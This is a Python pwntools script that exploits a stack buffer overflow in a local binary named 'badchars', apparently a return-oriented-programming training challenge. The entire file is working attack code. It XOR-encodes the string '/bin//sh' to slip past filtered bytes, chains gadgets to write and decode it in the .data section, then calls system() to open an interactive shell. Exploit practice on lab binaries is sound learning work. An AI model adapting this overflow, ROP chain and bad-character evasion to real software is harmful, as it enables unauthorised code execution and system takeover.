#!/usr/bin/python
from pwn import *

def main():
    junk = "A" * 40						# RIP Offset at 40
    sh_string = "/bin//sh"
    encoded_sh_string =""
    badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]	# Badchars: b i c / <space> f n s
    xored_value = [0x0]*8					# XOR valued array
    pos = 0
    data_addr = 0x601074					# .data section address

    # Encode the /bin//sh string using XOR to avoid badchars
    for i in sh_string:
    	encoded = ord(i) ^ xored_value[pos]
    	while encoded in badchars:
    		xored_value[pos] += 1
    		encoded = ord(i) ^ xored_value[pos]
    	encoded_sh_string += chr(encoded)
    	pos += 1

    # ROPChain to write the encoded_sh_string into .data section
    rop = p64(0x0000000000400b3b)	# pop r12; pop r13; ret
    rop += encoded_sh_string		# Encoded SH STRING
    rop += p64(data_addr)		# Data section address
    rop += p64(0x0000000000400b34)	# mov qword ptr [r13], r12 ; ret

    # ROPChain to decode the encoded_sh_string
    temp = data_addr
    for i in range (0,8):
    	rop += p64(0x0000000000400b40)		# pop r14 ; pop r15 ; ret
    	rop += p64(xored_value[i])		# the xored_value
    	rop += p64(temp)			# Data section address
    	rop += p64(0x0000000000400b30)		# xor byte ptr [r15], r14b ; ret
    	temp += 1				# Move 1 byte

    rop += p64(0x0000000000400b39)      # pop rdi; ret
    system_addr = p64(0x4006f0)
    p = process("./badchars")
    payload = junk + rop + p64(data_addr) + system_addr

    p.sendlineafter("s\n> ", payload)
    p.interactive()

if __name__ == "__main__":
    main()
